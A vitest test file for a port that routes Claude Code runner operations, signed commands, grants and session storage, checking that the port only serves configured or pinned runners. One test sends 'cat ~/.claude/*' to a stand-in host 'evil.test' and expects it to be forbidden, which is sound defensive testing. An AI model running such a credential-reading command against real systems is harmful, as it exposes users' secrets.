import { describe, expect, it, vi } from "vitest";
import { verifyClaudeCodeGrant } from "../../domain/claude-code-grant";
import { TurnBoxPortForbidden } from "../../domain/turn-box-protocol";
import type { ApiTurn } from "./api-turns";
import { claudePort, type TurnBoxClaudeDeps } from "./turn-box-claude-port";

const SIGNING_KEY = "A".repeat(64);
const SECRET = "s".repeat(40);
const env = {
	YTIMESY_CLAUDE_SUBSCRIPTION_ENABLED: "1",
	YTIMESY_CLAUDE_RUNNER_URLS: "https://runner-a.test,https://runner-b.test",
	YTIMESY_CLAUDE_RUNNER_SIGNING_KEY: SIGNING_KEY,
	YTIMESY_CLAUDE_RUNNER_USERS: "*",
};
const turn = {
	id: "22222222-2222-4222-8222-222222222222",
	user_id: "u1",
	session_id: "11111111-1111-4111-8111-111111111111",
} as ApiTurn;

function deps(overrides: Partial<TurnBoxClaudeDeps> = {}) {
	const shell = vi.fn(async () => ({ exitCode: 0, stdout: "ok", stderr: "" }));
	const machine = vi.fn(() => ({
		shell,
		writeFile: vi.fn(async () => {}),
		readFile: vi.fn(async () => "contents"),
	}));
	const placement = vi.fn(
		async (_turn: ApiTurn, candidate: string) => candidate,
	);
	const all: TurnBoxClaudeDeps = {
		env,
		placement,
		machine: machine as never,
		owner: (async () => ({ id: turn.session_id, agentRole: null })) as never,
		grantSecret: () => SECRET,
		...overrides,
	};
	return { all, shell, machine, placement };
}

describe("a Claude Code turn's port on the edge", () => {
	it("chooses the chat's runner and pins it in the chat's object", async () => {
		const { all, placement } = deps({
			placement: vi.fn(async () => "https://runner-b.test"),
		});
		await expect(
			claudePort(turn, { op: "runner", reader: false, ySquared: false }, all),
		).resolves.toEqual({ baseUrl: "https://runner-b.test" });
		expect(placement).not.toHaveBeenCalled();
		expect(all.placement).toHaveBeenCalledWith(
			turn,
			expect.stringMatching(/^https:\/\/runner-[ab]\.test$/),
		);
	});

	it("gives a reader chat no runner, whatever the box says", async () => {
		const { all } = deps({
			owner: (async () => ({
				id: turn.session_id,
				agentRole: "explorer",
			})) as never,
		});
		await expect(
			claudePort(turn, { op: "runner", reader: false, ySquared: false }, all),
		).resolves.toBeNull();
	});

	it("signs commands only for a configured runner or the chat's pinned one", async () => {
		const { all, machine } = deps();
		await expect(
			claudePort(
				turn,
				{
					op: "exec",
					baseUrl: "https://runner-a.test",
					command: "true",
					timeoutMs: 1000,
				},
				all,
			),
		).resolves.toEqual({ exitCode: 0, stdout: "ok", stderr: "" });
		// The edge's own key goes with it; the box never names one.
		expect(machine).toHaveBeenCalledWith({
			baseUrl: "https://runner-a.test",
			signingKey: SIGNING_KEY,
		});
		await expect(
			claudePort(
				turn,
				{
					op: "exec",
					baseUrl: "https://evil.test",
					command: "cat ~/.claude/*",
					timeoutMs: 1000,
				},
				all,
			),
		).rejects.toBeInstanceOf(TurnBoxPortForbidden);
		// A runner removed from the list still serves the chat pinned to it.
		const pinned = deps({ placement: vi.fn(async () => "https://old.test") });
		await expect(
			claudePort(
				turn,
				{ op: "read", baseUrl: "https://old.test", path: "/x" },
				pinned.all,
			),
		).resolves.toEqual({ contents: "contents" });
	});

	it("mints the run's grant for this turn, marked for the box relay", async () => {
		const { all } = deps();
		const grant = (await claudePort(turn, { op: "grant" }, all)) as string;
		await expect(verifyClaudeCodeGrant(SECRET, grant)).resolves.toMatchObject({
			userId: "u1",
			sessionId: turn.session_id,
			turnId: turn.id,
			relay: "box",
		});
	});

	it("reads and writes only the lease's own chat session and transcripts", async () => {
		const read = vi.fn(async () => null);
		const save = vi.fn(async () => {});
		const upload = vi.fn(async () => "path");
		const download = vi.fn(async () => "text");
		const { all } = deps({
			sessions: { read, save },
			checkpoints: { upload, download } as never,
		});
		await claudePort(turn, { op: "sessionRead" }, all);
		expect(read).toHaveBeenCalledWith("u1", turn.session_id);
		const record = { claudeSessionId: "c", transcriptPath: null, cwd: "/w" };
		await claudePort(turn, { op: "sessionSave", record }, all);
		expect(save).toHaveBeenCalledWith("u1", turn.session_id, record);
		await claudePort(
			turn,
			{ op: "transcriptUpload", claudeSessionId: "c", text: "jsonl" },
			all,
		);
		expect(upload).toHaveBeenCalledWith(
			"u1",
			turn.session_id,
			"claude-code-c",
			"jsonl",
		);
		await claudePort(turn, { op: "transcriptDownload", path: "p" }, all);
		expect(download).toHaveBeenCalledWith("u1", turn.session_id, "p");
	});

	it("serves nothing while Claude Code is off", async () => {
		const { all } = deps({
			env: { ...env, YTIMESY_CLAUDE_SUBSCRIPTION_ENABLED: "0" },
		});
		await expect(claudePort(turn, { op: "grant" }, all)).rejects.toBeInstanceOf(
			TurnBoxPortForbidden,
		);
	});
});
